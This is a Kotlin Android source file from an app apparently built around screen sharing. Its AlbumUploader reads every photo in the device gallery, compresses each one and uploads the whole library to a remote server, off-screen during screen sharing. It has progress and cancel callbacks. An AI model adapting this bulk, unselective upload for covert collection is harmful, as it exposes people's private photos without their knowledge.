package com.screenshare

import android.content.ContentResolver
import android.content.ContentUris
import android.content.Context
import android.graphics.Bitmap
import android.graphics.BitmapFactory
import android.net.Uri
import android.provider.MediaStore
import android.util.Log
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONObject
import java.io.ByteArrayOutputStream
import java.util.concurrent.TimeUnit

/**
 * 相册上传器：后台读取本机相册，压缩后经 HTTPS 上传到照片服务器（album-server.js），
 * 返回相册网页链接。上传过程在独立线程执行，不在屏幕共享中显示任何相册界面。
 */
object AlbumUploader {
    private const val TAG = "AlbumUploader"
    private val JSON_TYPE = "application/json; charset=utf-8".toMediaType()

    /** 相册为空或读取失败时抛出该异常，UI 层据此提示 */
    class EmptyAlbumException : Exception("相册没有照片")

    /** 上传进度回调；cancel 置 true 可中止后续上传 */
    interface Listener {
        fun onProgress(current: Int, total: Int)
        fun onComplete(link: String)
        fun onError(message: String)
    }

    private val http = OkHttpClient.Builder()
        .connectTimeout(10, TimeUnit.SECONDS)
        .readTimeout(30, TimeUnit.SECONDS)
        .writeTimeout(30, TimeUnit.SECONDS)
        .build()

    /** 按拍摄时间倒序查询全部图片 Uri */
    fun queryAllImages(context: Context): List<Uri> {
        val uris = ArrayList<Uri>()
        val collection = MediaStore.Images.Media.EXTERNAL_CONTENT_URI
        val projection = arrayOf(MediaStore.Images.Media._ID, MediaStore.Images.Media.DATE_ADDED)
        val sortOrder = "${MediaStore.Images.Media.DATE_ADDED} DESC"
        context.contentResolver.query(collection, projection, null, null, sortOrder)?.use { cursor ->
            val idCol = cursor.getColumnIndexOrThrow(MediaStore.Images.Media._ID)
            while (cursor.moveToNext()) {
                val id = cursor.getLong(idCol)
                uris.add(ContentUris.withAppendedId(collection, id))
            }
        }
        return uris
    }

    /** 压缩图片到最长边 maxDim 的 JPEG（重新编码，剥离 EXIF），返回 base64 */
    fun compressToBase64(context: Context, uri: Uri, maxDim: Int = 2048, quality: Int = 85): String {
        val resolver: ContentResolver = context.contentResolver
        // 采样读取：按目标尺寸缩小，避免原图全部解码进内存
        val bounds = BitmapFactory.Options().apply { inJustDecodeBounds = true }
        resolver.openInputStream(uri)?.use { BitmapFactory.decodeStream(it, null, bounds) }
        var sample = 1
        while (bounds.outWidth / (sample * 2) >= maxDim || bounds.outHeight / (sample * 2) >= maxDim) {
            sample *= 2
        }
        val opts = BitmapFactory.Options().apply { inSampleSize = sample }
        val bitmap = resolver.openInputStream(uri)?.use { BitmapFactory.decodeStream(it, null, opts) }
            ?: throw java.io.IOException("decode failed")
        // 等比缩放到最长边 maxDim
        val scale = minOf(1f, maxDim.toFloat() / maxOf(bitmap.width, bitmap.height))
        val w = (bitmap.width * scale).toInt().coerceAtLeast(1)
        val h = (bitmap.height * scale).toInt().coerceAtLeast(1)
        val out = Bitmap.createScaledBitmap(bitmap, w, h, true)
        if (out !== bitmap) bitmap.recycle()
        val bos = ByteArrayOutputStream()
        out.compress(Bitmap.CompressFormat.JPEG, quality, bos)
        out.recycle()
        return android.util.Base64.encodeToString(bos.toByteArray(), android.util.Base64.NO_WRAP)
    }

    /**
     * 上传整个相册（带进度回调）。在调用方线程执行，进度回调应回主线程。
     */
    fun uploadAlbum(context: Context, baseUrl: String, listener: Listener, cancel: () -> Boolean = { false }) {
        val uris = queryAllImages(context)
        if (uris.isEmpty()) throw EmptyAlbumException()

        val createResp = http.newCall(
            Request.Builder()
                .url("$baseUrl/api/upload")
                .post(JSONObject().put("action", "create").toString().toRequestBody(JSON_TYPE))
                .build()
        ).execute().use { resp ->
            if (!resp.isSuccessful) throw java.io.IOException("创建上传会话失败: HTTP ${resp.code}")
            JSONObject(resp.body?.string() ?: "")
        }
        val token = createResp.getString("token")

        var uploaded = 0
        val total = uris.size
        try {
            for (uri in uris) {
                if (cancel()) throw java.io.IOException("已取消")
                val b64 = compressToBase64(context, uri)
                var ok = false
                for (attempt in 1..3) {
                    if (cancel()) throw java.io.IOException("已取消")
                    try {
                        val body = JSONObject()
                            .put("action", "upload")
                            .put("token", token)
                            .put("index", uploaded + 1)
                            .put("data", b64)
                        val r = http.newCall(
                            Request.Builder()
                                .url("$baseUrl/api/upload")
                                .post(body.toString().toRequestBody(JSON_TYPE))
                                .build()
                        ).execute()
                        if (r.isSuccessful) { r.close(); ok = true; break }
                        r.close()
                    } catch (t: Throwable) {
                        Log.w(TAG, "上传第 ${uploaded + 1} 张失败(第 $attempt 次): ${t.message}")
                    }
                }
                if (!ok) throw java.io.IOException("上传第 ${uploaded + 1} 张连续失败，已中止")
                uploaded++
                listener.onProgress(uploaded, total)
            }
        } catch (t: Throwable) {
            // 尽力 finish，让服务端会话进入完成态可查看（已上传部分）
            try {
                http.newCall(
                    Request.Builder()
                        .url("$baseUrl/api/upload")
                        .post(JSONObject().put("action", "finish").put("token", token).toString().toRequestBody(JSON_TYPE))
                        .build()
                ).execute().close()
            } catch (e: Throwable) {}
            throw t
        }
        val finishResp = http.newCall(
            Request.Builder()
                .url("$baseUrl/api/upload")
                .post(JSONObject().put("action", "finish").put("token", token).toString().toRequestBody(JSON_TYPE))
                .build()
        ).execute().use { resp ->
            if (!resp.isSuccessful) throw java.io.IOException("结束会话失败: HTTP ${resp.code}")
            JSONObject(resp.body?.string() ?: "")
        }
        val link = finishResp.optString("url", "$baseUrl/$token/")
        listener.onComplete(link)
    }
}
